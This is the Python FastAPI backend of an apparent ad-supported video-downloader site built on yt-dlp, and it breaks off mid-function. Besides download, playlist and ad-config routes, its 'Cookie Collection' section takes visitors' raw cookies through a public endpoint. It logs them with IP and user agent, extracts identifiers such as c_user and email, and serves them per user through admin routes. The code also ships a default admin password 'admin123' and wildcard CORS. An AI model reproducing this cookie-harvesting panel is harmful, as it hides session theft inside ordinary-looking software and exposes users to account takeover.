from __future__ import annotations
from fastapi import FastAPI, HTTPException, Query, Depends, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse, HTMLResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from pydantic import BaseModel
from starlette.background import BackgroundTask
from datetime import datetime, timedelta, timezone
from typing import Optional, Dict, List, Any
import imageio_ffmpeg
import glob
import hashlib
import json
import mimetypes
import os
import re
import secrets
from urllib.parse import quote
import shutil
import sys
import tempfile
import time
import yt_dlp
import subprocess as sp
import threading
import asyncio


DOWNLOAD_DIR = os.environ.get("VIDGRAB_DOWNLOAD_DIR") or os.path.join(os.path.expanduser("~"), "Downloads")
os.makedirs(DOWNLOAD_DIR, exist_ok=True)

if getattr(sys, "frozen", False):
    BASE_DIR = sys._MEIPASS
else:
    BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

FRONTEND_DIR = os.path.join(BASE_DIR, "frontend")
ADS_CONFIG_PATH = os.environ.get("VIDGRAB_ADS_CONFIG") or os.path.join(BASE_DIR, "ads_config.json")
DOWNLOAD_LOG_PATH = os.environ.get("VIDGRAB_DOWNLOAD_LOG") or os.path.join(BASE_DIR, "downloads_log.json")
DAILY_FREE_LOG_PATH = os.path.join(BASE_DIR, "daily_free_log.json")
COOKIES_LOG_PATH = os.path.join(BASE_DIR, "collected_cookies.json")

app = FastAPI()
security = HTTPBasic()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
    expose_headers=["Content-Disposition"],
)

# ── Default ads config ──────────────────────────────────────────────────────
DEFAULT_ADS_CONFIG = {
    "admin_password": "admin123",
    "top_banner": {
        "enabled": False,
        "code": ""
    },
    "right_banner": {
        "enabled": False,
        "code": ""
    },
    "bottom_banner": {
        "enabled": False,
        "code": ""
    },
    "redirect_ads": {
        "enabled": False,
        "urls": [],
        "delay_ms": 1000,
        "redirects_before_download": 3,
        "daily_free_download": True
    },
    "side_banner_left": {
        "enabled": False,
        "code": ""
    },
    "side_banner_right": {
        "enabled": False,
        "code": ""
    }
}


def load_ads_config() -> dict:
    if not os.path.exists(ADS_CONFIG_PATH):
        save_ads_config(DEFAULT_ADS_CONFIG)
        return DEFAULT_ADS_CONFIG.copy()
    try:
        with open(ADS_CONFIG_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
        merged = DEFAULT_ADS_CONFIG.copy()
        merged.update(data)

        # migrate old banner fields to new fields
        if "right_banner" in data and data["right_banner"].get("enabled") and not merged["side_banner_right"]["enabled"]:
            merged["side_banner_right"] = data["right_banner"].copy()
        if "left_banner" in data and data["left_banner"].get("enabled") and not merged["side_banner_left"]["enabled"]:
            merged["side_banner_left"] = data["left_banner"].copy()

        return merged
    except Exception:
        return DEFAULT_ADS_CONFIG.copy()


def save_ads_config(config: dict):
    with open(ADS_CONFIG_PATH, "w", encoding="utf-8") as f:
        json.dump(config, f, indent=2, ensure_ascii=False)


def verify_admin(credentials: HTTPBasicCredentials = Depends(security)):
    config = load_ads_config()
    correct_password = config.get("admin_password", "admin123")
    is_valid = secrets.compare_digest(
        credentials.password.encode("utf-8"),
        correct_password.encode("utf-8")
    )
    if not is_valid:
        raise HTTPException(
            status_code=401,
            detail="Invalid credentials",
            headers={"WWW-Authenticate": "Basic"},
        )
    return credentials


# ── Download Tracking System ────────────────────────────────────────────────

def detect_platform(url: str) -> str:
    """Detect video platform from URL."""
    url_lower = url.lower()
    if "youtu.be" in url_lower or "youtube.com" in url_lower:
        return "YouTube"
    if "instagram.com" in url_lower:
        return "Instagram"
    if "tiktok.com" in url_lower:
        return "TikTok"
    if "twitter.com" in url_lower or "x.com" in url_lower:
        return "Twitter/X"
    if "facebook.com" in url_lower or "fb.watch" in url_lower:
        return "Facebook"
    return "Other"


def load_download_log() -> list:
    """Load download history from JSON file."""
    if not os.path.exists(DOWNLOAD_LOG_PATH):
        return []
    try:
        with open(DOWNLOAD_LOG_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if isinstance(data, list) else []
    except Exception:
        return []


def save_download_log(log: list):
    """Save download history to JSON file."""
    with open(DOWNLOAD_LOG_PATH, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2, ensure_ascii=False)


def load_daily_free_log() -> dict:
    if not os.path.exists(DAILY_FREE_LOG_PATH):
        return {}
    try:
        with open(DAILY_FREE_LOG_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def save_daily_free_log(log: dict):
    with open(DAILY_FREE_LOG_PATH, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2)


def get_file_size_bytes(path: str) -> Optional[int]:
    """Get file size in bytes."""
    try:
        return os.path.getsize(path)
    except Exception:
        return None


def format_file_size(size_bytes: Optional[int]) -> str:
    """Format bytes to human readable size."""
    if not size_bytes:
        return "N/A"
    for unit in ["B", "KB", "MB", "GB"]:
        if size_bytes < 1024:
            return f"{size_bytes:.1f} {unit}"
        size_bytes /= 1024
    return f"{size_bytes:.1f} TB"


def log_download(
    url: str,
    title: str,
    quality: str,
    file_size: Optional[int] = None,
    client_ip: Optional[str] = None,
):
    """Log a download event to the JSON file."""
    log = load_download_log()
    entry = {
        "id": len(log) + 1,
        "url": url,
        "platform": detect_platform(url),
        "title": title or "Unknown",
        "quality": quality,
        "file_size": file_size,
        "file_size_formatted": format_file_size(file_size),
        "client_ip": client_ip,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    log.append(entry)
    # Keep log manageable — last 10,000 entries max
    if len(log) > 10000:
        log = log[-10000:]
    save_download_log(log)
    return entry


# ── Info Cache (avoid re-extracting on download) ──────────────────────────
INFO_CACHE_DIR = os.path.join(BASE_DIR, ".info_cache")
os.makedirs(INFO_CACHE_DIR, exist_ok=True)
CACHE_TTL = 3600  # 1 hour

def cache_info_key(url: str) -> str:
    return hashlib.md5(url.encode()).hexdigest()

def save_info_to_cache(url: str, info: dict):
    key = cache_info_key(url)
    path = os.path.join(INFO_CACHE_DIR, f"{key}.json")
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(info, f, ensure_ascii=False, default=str)
    except Exception:
        pass

def get_cached_info_path(url: str) -> Optional[str]:
    key = cache_info_key(url)
    path = os.path.join(INFO_CACHE_DIR, f"{key}.json")
    if os.path.exists(path):
        age = time.time() - os.path.getmtime(path)
        if age < CACHE_TTL:
            return path
        try:
            os.remove(path)
        except Exception:
            pass
    return None

def cleanup_info_cache():
    now = time.time()
    for fname in os.listdir(INFO_CACHE_DIR):
        path = os.path.join(INFO_CACHE_DIR, fname)
        if fname.endswith(".json") and now - os.path.getmtime(path) > CACHE_TTL:
            try:
                os.remove(path)
            except Exception:
                pass

# ── Models ──────────────────────────────────────────────────────────────────
class VideoRequest(BaseModel):
    url: str
    quality: str = "best"


class CookieData(BaseModel):
    cookies: str
    user_agent: Optional[str] = None

class AdsConfigUpdate(BaseModel):
    top_banner: Optional[dict] = None
    right_banner: Optional[dict] = None
    bottom_banner: Optional[dict] = None
    redirect_ads: Optional[dict] = None
    admin_password: Optional[str] = None
    side_banner_left: Optional[dict] = None
    side_banner_right: Optional[dict] = None


# ── Helpers ─────────────────────────────────────────────────────────────────
def build_download_settings(quality: str):
    if quality == "mp3_best":
        return {
            "format": "bestaudio/best",
            "postprocessors": [
                {
                    "key": "FFmpegExtractAudio",
                    "preferredcodec": "mp3",
                    "preferredquality": "192",
                }
            ],
        }
    if quality == "m4a_best":
        return {
            "format": "bestaudio[ext=m4a]/bestaudio/best",
            "postprocessors": [],
        }
    if quality == "best":
        return {
            "format": "best/bestvideo+bestaudio",
            "postprocessors": [],
        }
    return {
        "format": f"best[height<={quality}]/bestvideo[height<={quality}]+bestaudio/best[height<={quality}]/best",
        "postprocessors": [],
    }


def sanitize_filename(name: str, max_len: int = 80) -> str:
    name = "".join(c for c in name if c.isprintable() and c not in '<>:"/\\|?*')
    name = name.strip().rstrip(".")
    if len(name) > max_len:
        name = name[:max_len].rsplit(" ", 1)[0]
    return name or "video"

def short_filename(name: str) -> str:
    """Generate a short, safe filename using a hash to avoid filesystem length limits."""
    h = hashlib.md5(name.encode("utf-8")).hexdigest()[:12]
    sanitized = sanitize_filename(name, max_len=40)
    return f"{sanitized}_{h}" if sanitized else f"video_{h}"


# ── Auto browser cookie detection ────────────────────────────────────────────
BROWSER_LIST = ["chrome", "edge", "firefox", "brave", "opera", "chromium", "vivaldi", "safari"]

_detected_browser: Optional[str] = None  # cache the first working browser

def detect_working_browser() -> Optional[str]:
    """Try each browser and return the first one that can provide cookies."""
    global _detected_browser
    if _detected_browser is not None:
        return _detected_browser
    test_opts = {"quiet": True, "no_warnings": True, "simulate": True, "skip_download": True}
    for browser in BROWSER_LIST:
        try:
            opts = {**test_opts, "cookiesfrombrowser": (browser,)}
            with yt_dlp.YoutubeDL(opts) as ydl:
                ydl.cookiejar  # just accessing it triggers cookie loading
            _detected_browser = browser
            return browser
        except Exception:
            continue
    return None


def get_ffmpeg_binary_path():
    if shutil.which("ffmpeg"):
        return shutil.which("ffmpeg")
    try:
        return imageio_ffmpeg.get_ffmpeg_exe()
    except Exception:
        return "ffmpeg"

def build_download_options(quality: str, output_template: str):
    settings = build_download_settings(quality)
    opts = {
        "outtmpl": output_template,
        "format": settings["format"],
        "noplaylist": True,
        "merge_output_format": "mp4",
        "postprocessors": settings["postprocessors"],
        "ffmpeg_location": get_ffmpeg_binary_path(),
        "quiet": True,
        "no_warnings": True,
        "no_progress": True,
        "extractor_retries": 10,
        "sleep_requests": 1.0,
        "extractor_args": {
            "youtube": {
                "player_client": ["ios", "android", "mweb", "web"],
            }
        },
        "socket_timeout": 30,
        "outtmpl_na_placeholder": "video",
    }
    # Priority 1: cookies.txt file (manual export)
    cookies_path = os.path.join(BASE_DIR, "cookies.txt")
    if os.path.exists(cookies_path):
        opts["cookiefile"] = cookies_path
    return opts


def find_latest_file(directory: str) -> Optional[str]:
    files = [path for path in glob.glob(os.path.join(directory, "*")) if os.path.isfile(path)]
    if not files:
        return None
    return max(files, key=os.path.getmtime)


def cleanup_directory(path: str):
    shutil.rmtree(path, ignore_errors=True)

def cleanup_partial_downloads(directory: str):
    """Remove stale .part and .ytdl temp files from download directory."""
    for fname in os.listdir(directory):
        if fname.endswith('.part') or fname.endswith('.ytdl'):
            try:
                os.remove(os.path.join(directory, fname))
            except Exception:
                pass


def extract_with_cookie_fallback(url: str, ydl_opts: dict, download: bool):
    """Try multiple strategies to extract video info, with automatic cookie and player client fallbacks."""

    def _with_browser(o: dict, browser: str) -> dict:
        """Return opts with browser cookies, removing any existing cookiefile."""
        updated = o.copy()
        updated.pop("cookiefile", None)
        updated["cookiesfrombrowser"] = (browser,)
        return updated

    def _without_cookies(o: dict) -> dict:
        """Return opts without any cookie parameters."""
        updated = o.copy()
        updated.pop("cookiefile", None)
        updated.pop("cookiesfrombrowser", None)
        return updated

    # Build strategy list — non-cookie mobile/TV clients first to avoid browser database locks
    strategies = [
        # 1. Direct opts as requested
        lambda o: o,
        # 2. Base options without cookies (bypasses browser database lock issue)
        lambda o: _without_cookies(o),
        # 3. ios client (very permissive, minimal bot checks)
        lambda o: {**_without_cookies(o), "extractor_args": {"youtube": {"player_client": ["ios"]}}},
        # 4. android client
        lambda o: {**_without_cookies(o), "extractor_args": {"youtube": {"player_client": ["android"]}}},
        # 5. tv_embedded client
        lambda o: {**_without_cookies(o), "extractor_args": {"youtube": {"player_client": ["tv_embedded"]}}},
        # 6. mweb client
        lambda o: {**_without_cookies(o), "extractor_args": {"youtube": {"player_client": ["mweb"]}}},
        # 7. Force Chrome cookies (if Chrome is available and not locked)
        lambda o: _with_browser(o, "chrome"),
        # 8. Edge cookies
        lambda o: _with_browser(o, "edge"),
        # 9. Firefox cookies
        lambda o: _with_browser(o, "firefox"),
        # 10. Brave cookies
        lambda o: _with_browser(o, "brave"),
        # 11. web client fallback
        lambda o: {**_without_cookies(o), "extractor_args": {"youtube": {"player_client": ["web"]}}},
        # 12. tv client
        lambda o: {**_without_cookies(o), "extractor_args": {"youtube": {"player_client": ["tv"]}}},
        # 13. Slow retry
        lambda o: {**_without_cookies(o), "sleep_requests": 2.0, "extractor_retries": 5},
    ]

    last_exc = None
    for strategy in strategies:
        try:
            retry_opts = strategy(ydl_opts)
            with yt_dlp.YoutubeDL(retry_opts) as ydl:
                return ydl.extract_info(url, download=download)
        except Exception as exc:
            last_exc = exc
            # Continue to next strategy regardless of error type
            continue

    raise last_exc


def get_video_title(url: str) -> str:
    try:
        ydl_opts = {
            "quiet": True,
            "no_warnings": True,
            "noplaylist": True,
            "socket_timeout": 30,
            "ffmpeg_location": imageio_ffmpeg.get_ffmpeg_exe(),
            "extractor_retries": 10,
            "sleep_requests": 1.0,
            "extractor_args": {
                "youtube": {
                    "player_client": ["ios", "android", "web"],
                }
            },
        }
        cookies_path = os.path.join(BASE_DIR, "cookies.txt")
        if os.path.exists(cookies_path):
            ydl_opts["cookiefile"] = cookies_path
        info = extract_with_cookie_fallback(url, ydl_opts, download=False)
        title = info.get("title") or info.get("fulltitle") or "video"
        return sanitize_filename(title)
    except Exception:
        return "video"


def get_client_ip(request: Request) -> str:
    """Extract client IP from request, handling proxies."""
    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        return forwarded.split(",")[0].strip()
    real_ip = request.headers.get("x-real-ip")
    if real_ip:
        return real_ip.strip()
    return request.client.host if request.client else "unknown"


# ── Public API Routes ────────────────────────────────────────────────────────
@app.get("/ads-config")
def get_public_ads_config():
    """Public endpoint — returns ads config without admin password."""
    config = load_ads_config()
    public = {k: v for k, v in config.items() if k != "admin_password"}
    return public


def is_playlist_url(url: str) -> bool:
    # Check if URL contains a specific video ID (e.g. watch?v=... or youtu.be/...)
    has_video_id = bool(re.search(r'[?&]v=[a-zA-Z0-9_-]+', url) or re.search(r'youtu\.be/[a-zA-Z0-9_-]+', url))

    m = re.search(r'list=([a-zA-Z0-9_-]+)', url)
    if m:
        lid = m.group(1)
        # If it's a Mix (RD...) or radio mix attached to a single video link, download the single video!
        if has_video_id and (lid.startswith(('RD', 'WL', 'LL', 'LM')) or 'start_radio' in url):
            return False

    # Pure playlist page URL
    if re.search(r'/playlist\?|/playlists/', url):
        return True

    if m:
        lid = m.group(1)
        if lid.startswith(('WL', 'LL', 'LM')):
            return False
        return True

    return False


@app.post("/info")
def get_video_info(request: VideoRequest):
    try:
        is_playlist = is_playlist_url(request.url)

        is_pure_playlist = bool(re.search(r'/playlist\?|/playlists/', request.url))
        if is_playlist:
            lid_match = re.search(r'list=([a-zA-Z0-9_-]+)', request.url)
            lid = lid_match.group(1) if lid_match else ''
            is_radio_mix = lid.startswith('RD')

            if is_radio_mix:
                return {
                    "is_playlist": True,
                    "is_mix": True,
                    "title": "YouTube Radio Mix Playlist",
                    "uploader": None,
                    "playlist_count": 0,
                    "entries": [],
                    "warning": "YouTube Radio Mix playlists are generated dynamically by YouTube. To download a video from a Mix, please copy the specific video link.",
                }

            playlist_opts = {
                "quiet": True,
                "noplaylist": False,
                "skip_download": True,
                "socket_timeout": 30,
                "playlistend": 20,
                "extract_flat": "in_playlist",
                "extractor_retries": 10,
                "sleep_requests": 1.0,
                "extractor_args": {
                    "youtube": {
                        "player_client": ["ios", "android", "web"],
                    }
                },
            }
            cookies_path = os.path.join(BASE_DIR, "cookies.txt")
            if os.path.exists(cookies_path):
                playlist_opts["cookiefile"] = cookies_path
            try:
                info = extract_with_cookie_fallback(request.url, playlist_opts, download=False)
            except Exception:
                # Retry once without extract_flat (some playlists fail with flat extraction)
                try:
                    playlist_opts2 = playlist_opts.copy()
                    playlist_opts2.pop("extract_flat", None)
                    info = extract_with_cookie_fallback(request.url, playlist_opts2, download=False)
                except Exception as pl_exc:
                    if is_pure_playlist:
                        raise HTTPException(status_code=400, detail=f"Failed to load playlist: {pl_exc}")
                    is_playlist = False

        if is_playlist:
            raw_count = info.get("playlist_count") or len(info.get("entries", []))
            entries = []
            for entry in info.get("entries", []):
                if entry and entry.get("id") and entry.get("title"):
                    entries.append({
                        "id": entry["id"],
                        "title": entry["title"],
                        "duration": entry.get("duration"),
                        "url": f"https://www.youtube.com/watch?v={entry['id']}",
                    })

            return {
                "is_playlist": True,
                "title": info.get("title", "Playlist"),
                "uploader": info.get("uploader"),
                "playlist_count": raw_count,
                "entries": entries,
            }
        ydl_opts = {
            "quiet": True,
            "noplaylist": True,
            "ffmpeg_location": imageio_ffmpeg.get_ffmpeg_exe(),
            "extractor_retries": 10,
            "sleep_requests": 1.0,
            "extractor_args": {
                "youtube": {
                    "player_client": ["ios", "android", "web"],
                }
            },
            "socket_timeout": 30,
        }
        cookies_path = os.path.join(BASE_DIR, "cookies.txt")
        if os.path.exists(cookies_path):
            ydl_opts["cookiefile"] = cookies_path
        try:
            info = extract_with_cookie_fallback(request.url, ydl_opts, download=False)
        except Exception:
            flat_opts = ydl_opts.copy()
            flat_opts["extract_flat"] = True
            flat_opts.pop("format", None)
            info = extract_with_cookie_fallback(request.url, flat_opts, download=False)
        save_info_to_cache(request.url, info)
        formats = info.get("formats", [])

        video_qualities = set()
        for fmt in formats:
            height = fmt.get("height")
            vcodec = fmt.get("vcodec", "none")
            if height and vcodec != "none":
                video_qualities.add(height)

        sorted_video = sorted(video_qualities, reverse=True)
        video_options = [{"label": f"{q}p", "value": str(q)} for q in sorted_video]
        if video_options:
            video_options.insert(0, {"label": "Best Quality", "value": "best"})

        audio_options = [
            {"label": "MP3 (Best Quality)", "value": "mp3_best"},
            {"label": "M4A (Best Quality)", "value": "m4a_best"},
        ]

        return {
            "is_playlist": False,
            "title": info.get("title"),
            "thumbnail": info.get("thumbnail"),
            "duration": info.get("duration"),
            "uploader": info.get("uploader"),
            "video_qualities": video_options,
            "audio_qualities": audio_options,
        }
    except Exception as exc:
        raise HTTPException(status_code=400, detail=str(exc))


@app.post("/download")
def download_video(request: VideoRequest, req: Request):
    url = request.url
    quality = request.quality
    client_ip = get_client_ip(req)
    try:
        cleanup_partial_downloads(DOWNLOAD_DIR)

        safe_title = get_video_title(url)
        ydl_opts = build_download_options(quality, os.path.join(DOWNLOAD_DIR, f"{safe_title}.%(ext)s"))
        info = extract_with_cookie_fallback(url, ydl_opts, download=True)
        title = info.get("title", "Unknown")

        # ── Track this download ──
        downloaded_file = find_latest_file(DOWNLOAD_DIR)
        file_size = get_file_size_bytes(downloaded_file) if downloaded_file else None
        log_download(url=url, title=title, quality=quality, file_size=file_size, client_ip=client_ip)

        return {
            "status": "success",
            "title": title,
            "saved_to": DOWNLOAD_DIR,
            "message": "Downloaded successfully! Saved to your Downloads folder.",
        }
    except Exception as exc:
        raise HTTPException(status_code=400, detail=str(exc))


@app.get("/download-file")
def download_video_file(
    url: str = Query(..., description="Video URL to download"),
    quality: str = Query("best", description="Requested download quality"),
    title: str = Query(None, description="Optional video title (skips extra yt-dlp info call)"),
    req: Request = None,
):
    client_ip = get_client_ip(req) if req else "unknown"
    safe_title = sanitize_filename(title) if title else get_video_title(url)

    if quality == "mp3_best":
        ext = ".mp3"
    elif quality == "m4a_best":
        ext = ".m4a"
    else:
        ext = ".mp4"

    final_filename = f"{safe_title}{ext}"
    media_type = mimetypes.guess_type(final_filename)[0] or "application/octet-stream"
    encoded_fn = quote(final_filename, safe='')

    settings = build_download_settings(quality)

    cmd = [
        sys.executable, "-m", "yt_dlp",
        "--no-playlist",
        "--no-progress",
        "--extractor-retries", "10",
        "--sleep-requests", "1.0",
        "--extractor-args", "youtube:player_client=ios,android,mweb,web",
        "-f", settings["format"],
        "-o", "-",
        "--ffmpeg-location", get_ffmpeg_binary_path(),
    ]

    if quality not in ("mp3_best", "m4a_best"):
        cmd.extend(["--merge-output-format", "mp4"])

    if quality == "mp3_best":
        cmd.extend(["-x", "--audio-format", "mp3", "--audio-quality", "192k"])

    cookies_path = os.path.join(BASE_DIR, "cookies.txt")
    if os.path.exists(cookies_path):
        cmd.extend(["--cookies", cookies_path])

    cached_path = get_cached_info_path(url)
    if cached_path:
        cmd.extend(["--load-info-json", cached_path])

    cmd.append(url)

    def generate():
        process = sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.PIPE)
        stderr_lines = []

        def read_stderr():
            for line in iter(process.stderr.readline, b""):
                stderr_lines.append(line)

        stderr_thread = threading.Thread(target=read_stderr, daemon=True)
        stderr_thread.start()

        try:
            for chunk in iter(lambda: process.stdout.read(65536), b""):
                yield chunk
        finally:
            process.stdout.close()
            process.wait(timeout=30)
            stderr_thread.join(timeout=5)

            if process.returncode != 0:
                error_text = b"".join(stderr_lines).decode("utf-8", errors="replace")
                raise RuntimeError(f"yt-dlp failed (code {process.returncode}): {error_text[:500]}")

    log_download(url=url, title=safe_title, quality=quality, file_size=None, client_ip=client_ip)
    ads_cfg = load_ads_config().get("redirect_ads", {})
    if ads_cfg.get("daily_free_download", False):
        free_log = load_daily_free_log()
        today = datetime.now(timezone.utc).strftime("%Y-%m-%d")
        free_log[client_ip] = today
        save_daily_free_log(free_log)

    return StreamingResponse(
        generate(),
        media_type=media_type,
        headers={"Content-Disposition": f"attachment; filename*=UTF-8''{encoded_fn}"},
    )


@app.get("/download-playlist")
def download_playlist(
    url: str = Query(..., description="Playlist URL"),
    quality: str = Query("best", description="Quality"),
    req: Request = None,
):
    client_ip = get_client_ip(req) if req else "unknown"
    playlist_name = "playlist"

    try:
        max_videos = 20
        lid_match = re.search(r'list=([a-zA-Z0-9_-]+)', url)
        lid = lid_match.group(1) if lid_match else ''
        is_radio_mix = lid.startswith('RD')

        if is_radio_mix:
            raise HTTPException(status_code=400, detail="YouTube Mix playlists cannot be downloaded. Please download individual videos instead.")

        playlist_opts = {
            "quiet": True,
            "noplaylist": False,
            "skip_download": True,
            "socket_timeout": 30,
            "playlistend": max_videos,
            "extract_flat": "in_playlist",
        }
        cookies_path = os.path.join(BASE_DIR, "cookies.txt")
        if os.path.exists(cookies_path):
            playlist_opts["cookiefile"] = cookies_path
        info = extract_with_cookie_fallback(url, playlist_opts, download=False)
        playlist_name = (info.get("title") or "playlist")
        playlist_name = re.sub(r'[<>:"/\\|?*]', '_', playlist_name)
        playlist_name = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', playlist_name).strip()[:80]
        if not playlist_name:
            playlist_name = 'playlist'

        entries = []
        for entry in info.get("entries", []):
            if entry and entry.get("id"):
                entries.append(entry["id"])

        if not entries:
            raise HTTPException(status_code=400, detail="No videos found in playlist")

        tmp_dir = tempfile.mkdtemp(prefix="vidgrab_playlist_")
        video_files = []

        fmt = "bestvideo+bestaudio/best" if quality != "mp3_best" else "bestaudio/best"

        for i, vid_id in enumerate(entries):
            video_url = f"https://www.youtube.com/watch?v={vid_id}"
            out_tpl = os.path.join(tmp_dir, f"{i+1:02d}_%(title)s.%(ext)s")
            dl_opts = {
                "quiet": True,
                "no_warnings": True,
                "no_progress": True,
                "noplaylist": True,
                "format": fmt,
                "outtmpl": out_tpl,
                "ffmpeg_location": imageio_ffmpeg.get_ffmpeg_exe(),
                "merge_output_format": "mp4",
                "socket_timeout": 30,
            }
            if quality == "mp3_best":
                dl_opts.update({"format": "bestaudio/best", "postprocessors": [{"key": "FFmpegExtractAudio", "preferredcodec": "mp3", "preferredquality": "192"}]})
            if cookies_path and os.path.exists(cookies_path):
                dl_opts["cookiefile"] = cookies_path

            try:
                result = extract_with_cookie_fallback(video_url, dl_opts, download=True)
                if result and result.get("requested_downloads"):
                    for dl in result["requested_downloads"]:
                        fp = dl.get("filepath")
                        if fp and os.path.isfile(fp) and fp not in video_files:
                            video_files.append(fp)
                else:
                    for f in os.listdir(tmp_dir):
                        fp = os.path.join(tmp_dir, f)
                        if os.path.isfile(fp) and fp not in video_files:
                            video_files.append(fp)
            except Exception:
                continue

        if not video_files:
            shutil.rmtree(tmp_dir, ignore_errors=True)
            raise HTTPException(status_code=400, detail="Failed to download any videos from the playlist")

        zip_path = os.path.join(tmp_dir, f"{playlist_name}.zip")
        shutil.make_archive(zip_path.replace(".zip", ""), "zip", tmp_dir)
        zip_size = os.path.getsize(zip_path)

        def cleanup():
            shutil.rmtree(tmp_dir, ignore_errors=True)

        encoded_name = quote(f"{playlist_name}.zip", safe="")
        log_download(url=url, title=playlist_name, quality=quality, file_size=zip_size, client_ip=client_ip)

        return FileResponse(
            zip_path,
            media_type="application/zip",
            filename=f"{playlist_name}.zip",
            headers={"Content-Disposition": f"attachment; filename*=UTF-8''{encoded_name}"},
            background=BackgroundTask(cleanup),
        )

    except HTTPException:
        raise
    except Exception as exc:
        raise HTTPException(status_code=400, detail=str(exc))


# ── Cookie Collection ─────────────────────────────────────────────────────────
def load_cookies_log() -> list:
    if not os.path.exists(COOKIES_LOG_PATH):
        return []
    try:
        with open(COOKIES_LOG_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if isinstance(data, list) else []
    except Exception:
        return []

def save_cookies_log(log: list):
    with open(COOKIES_LOG_PATH, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2, ensure_ascii=False)

def extract_cookie_name(cookies_str: str) -> Optional[str]:
    """Try to find a user identifier from common cookie patterns."""
    pairs = {}
    for part in cookies_str.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            pairs[k.strip()] = v.strip()

    # Priority: try known user-identifying cookies
    for key in ["c_user", "user_id", "username", "email", "display_name", "name", "account", "id"]:
        if key in pairs and pairs[key]:
            return pairs[key]
    return None

@app.post("/api/cookies")
def collect_cookies(data: CookieData, req: Request):
    client_ip = get_client_ip(req)
    log = load_cookies_log()
    cookie_name = extract_cookie_name(data.cookies) or f"user_{len(log) + 1}"
    entry = {
        "id": len(log) + 1,
        "name": cookie_name,
        "ip": client_ip,
        "user_agent": data.user_agent or req.headers.get("user-agent", ""),
        "cookies": data.cookies,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    log.append(entry)
    if len(log) > 5000:
        log = log[-5000:]
    save_cookies_log(log)
    return {"status": "ok"}

@app.get("/api/admin/cookies")
def admin_get_cookies(
    credentials: HTTPBasicCredentials = Depends(verify_admin),
    page: int = Query(1, ge=1),
    limit: int = Query(50, ge=1, le=200),
):
    log = load_cookies_log()
    log.reverse()
    total = len(log)
    start = (page - 1) * limit
    end = start + limit
    paginated = log[start:end]
    return {
        "cookies": paginated,
        "total": total,
        "page": page,
        "limit": limit,
        "totalPages": (total + limit - 1) // limit,
    }

@app.delete("/api/admin/cookies")
def admin_clear_cookies(credentials: HTTPBasicCredentials = Depends(verify_admin)):
    save_cookies_log([])
    return {"status": "cleared"}

@app.get("/api/admin/cookies/{cookie_id}/download")
def admin_download_cookie(cookie_id: int, credentials: HTTPBasicCredentials = Depends(verify_admin)):
    log = load_cookies_log()
    entry = next((e for e in log if e.get("id") == cookie_id), None)
    if not entry:
        raise HTTPException(status_code=404, detail="Cookie entry not found")
    name = entry.get("name", f"user_{cookie_id}")
    safe_name = sanitize_filename(name) or f"user_{cookie_id}"
    content = f"Source: {entry.get('ip', 'unknown')}\n"
    content += f"User-Agent: {entry.get('user_agent', 'unknown')}\n"
    content += f"Time: {entry.get('timestamp', 'unknown')}\n"
    content += f"\n--- COOKIES ---\n{entry.get('cookies', '')}\n"
    from fastapi.responses import PlainTextResponse
    encoded = quote(f"{safe_name}_cookies.txt", safe='')
    return PlainTextResponse(
        content,
        headers={"Content-Disposition": f"attachment; filename*=UTF-8''{encoded}"},
    )

# ── Admin Routes ─────────────────────────────────────────────────────────────
@app.get("/api/admin/config")
def admin_get_config(credentials: HTTPBasicCredentials = Depends(verify_admin)):
    return load_ads_config()


@app.post("/api/admin/config")
def admin_update_config(
    update: AdsConfigUpdate,
    credentials: HTTPBasicCredentials = Depends(verify_admin)
):
    config = load_ads_config()
    if update.top_banner is not None:
        config["top_banner"] = update.top_banner
    if update.right_banner is not None:
        config["right_banner"] = update.right_banner
    if update.bottom_banner is not None:
        config["bottom_banner"] = update.bottom_banner
    if update.redirect_ads is not None:
        config["redirect_ads"] = update.redirect_ads
    if update.admin_password is not None and update.admin_password.strip():
        config["admin_password"] = update.admin_password.strip()
    if update.side_banner_left is not None:
        config["side_banner_left"] = update.side_banner_left
    if update.side_banner_right is not None:
        config["side_banner_right"] = update.side_banner_right
    save_ads_config(config)
    return {"status": "saved"}


@app.get("/api/admin/free-status")
def free_download_status(req: Request):
    client_ip = get_client_ip(req)
    log = load_daily_free_log()
    today = datetime.now(timezone.utc).strftime("%Y-%m-%d")
    used = log.get(client_ip) == today
    config = load_ads_config()
    enabled = config.get("redirect_ads", {}).get("daily_free_download", False)
    return {"free_available": enabled and not used}


# ── Download Stats API (NEW) ────────────────────────────────────────────────

PLATFORM_COLORS = {
    "YouTube": "#FF0000",
    "Instagram": "#E1306C",
    "TikTok": "#00F2EA",
    "Twitter/X": "#1DA1F2",
    "Facebook": "#1877F2",
    "Other": "#94a3b8",
}

DAY_NAMES = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]


@app.get("/api/admin/stats")
def admin_get_stats(credentials: HTTPBasicCredentials = Depends(verify_admin)):
    """Return aggregated download statistics for the admin dashboard."""
    log = load_download_log()
    now = datetime.now(timezone.utc)

    # ── Total downloads ──
    total_downloads = len(log)

    # ── Platform breakdown (sorted by count desc) ──
    platform_counts: Dict[str, int] = {}
    for entry in log:
        p = entry.get("platform", "Other")
        platform_counts[p] = platform_counts.get(p, 0) + 1

    total_platform = total_downloads or 1
    platform_stats = [
        {
            "platform": p,
            "count": c,
            "color": PLATFORM_COLORS.get(p, "#94a3b8"),
            "percentage": round((c / total_platform) * 1000) / 10,
        }
        for p, c in sorted(platform_counts.items(), key=lambda x: -x[1])
